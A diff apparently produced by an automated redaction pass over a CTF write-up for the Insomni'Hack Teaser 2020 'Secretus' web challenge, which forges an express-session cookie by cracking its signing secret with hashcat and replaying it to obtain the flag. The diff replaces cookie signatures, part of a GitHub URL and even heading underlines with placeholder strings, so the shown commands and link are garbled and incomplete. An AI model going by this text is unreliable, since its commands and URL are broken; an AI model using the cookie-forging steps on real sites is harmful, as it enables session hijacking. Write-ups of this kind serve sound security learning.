@@ -1,8 +1,8 @@
 [«](https://blog.vihan.org/) Insomni\'Hack Teaser CTF 2020: Write-ups
-=====================================================================
+SECRET_REDACTED_BY_ANTIGRAVITY=============================
 
 [](https://blog.vihan.org/insomnihack-2020/#web){.anchor}Web
-============================================================
+SECRET_REDACTED_BY_ANTIGRAVITY====================
 
 [](https://blog.vihan.org/insomnihack-2020/#secretus){.anchor}Secretus
 ----------------------------------------------------------------------
@@ -56,7 +56,7 @@ the header by default used for logging in. Let's try this:
     $ http GET http://secretus.insomnihack.ch/secret Authorization:secret
     HTTP/1.1 200 OK
     ... blah ...
-    Set-Cookie: connect.sid=s%3Alkdh18zhtZX-vve8gThP8_NEoTkr-OsT.T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF%2Fk; Path=/; HttpOnly
+    Set-Cookie: connect.sid=s%3Alkdh18zhtZX-vve8gThP8_NEoTkr-OsT.SECRET_REDACTED_BY_ANTIGRAVITYF%2Fk; Path=/; HttpOnly
 
 This now will take us to a page where we can add a 'token' which the
 server will save. However, this input does not appear to be vulnerable
@@ -72,10 +72,10 @@ work:
 These look exactly like files for the session IDs from before. The issue
 is let's analyze the decoded session cookie from above. I looked up the
 [source code for
-`express-session`](https://github.com/expressjs/session/blob/85682a2a56c5bdbed8d7e7cd2cc5e1343c951af6/index.js#L645)
+`express-session`](https://github.SECRET_REDACTED_BY_ANTIGRAVITYdbed8d7e7cd2cc5e1343c951af6/index.js#L645)
 which reveals the following format:
 
-    s:lkdh18zhtZX-vve8gThP8_NEoTkr-OsT.T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF/k
+    s:lkdh18zhtZX-vve8gThP8_NEoTkr-OsT.SECRET_REDACTED_BY_ANTIGRAVITYF/k
     ^ ^                                ^
     | |                                |
     + Prefix                           + Session ID hash
@@ -95,7 +95,7 @@ Let's convert the hash into hex and then format it like
 `<hash in hex>:<value>` so that way we can pass it into hashcat.
 
     $ echo $(
-        echo 'T4zrDEc9N2RbIViBsst5ZlWo1DfWLu0tKMTtEgmLF/k' |
+        echo 'SECRET_REDACTED_BY_ANTIGRAVITYF/k' |
         base64 -D |
         xxd -p
       ):lkdh18zhtZX-vve8gThP8_NEoTkr-OsT > hash.txt
@@ -121,7 +121,7 @@ new secret tokens using the new session ID:
 
     $ http GET http://secretus.insomnihack.ch/secret \
         Authorization:secret \  
-        Cookie:'connect.sid=s:C35XelHWhFhnbGnpMH5fBMGLLT0C1q0J.OMmTzUU8LzDDETCg/Iprq+q66D+3QDmLCBXW5uTZbPk; Path=/; HttpOnly' \
+        Cookie:'connect.sid=s:C35XelHWhFhnbGnpMH5fBMGLLT0C1q0J.SECRET_REDACTED_BY_ANTIGRAVITYbPk; Path=/; HttpOnly' \
         | pup ul li text{}
 
     INS{BeSureYourSecretIsActuallySecret}
